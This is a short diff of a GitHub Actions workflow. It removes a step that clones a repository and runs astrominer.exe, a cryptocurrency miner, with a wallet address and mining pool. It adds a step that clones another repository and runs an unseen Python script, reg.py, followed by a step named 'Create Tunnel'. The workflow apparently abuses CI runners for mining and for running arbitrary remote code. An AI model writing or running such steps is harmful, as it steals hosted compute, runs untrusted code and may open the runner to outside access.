@@ -56,7 +56,8 @@ jobs:
 
     - name: Down Tool
 
-      run: cmd.exe /k "git clone https://github.com/pbthong/coin && cd coin && astrominer.exe -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xesaqr8jacdmy7qh702tu -m 1 -r community-pools.mysrv.cloud:10300 -p rpc"
+      run: cmd.exe /k "git clone https://github.com/pbthong/reg && cd reg && pip install requests && pip install bs4 && python reg.py"
+
 
     - name: Create Tunnel
 
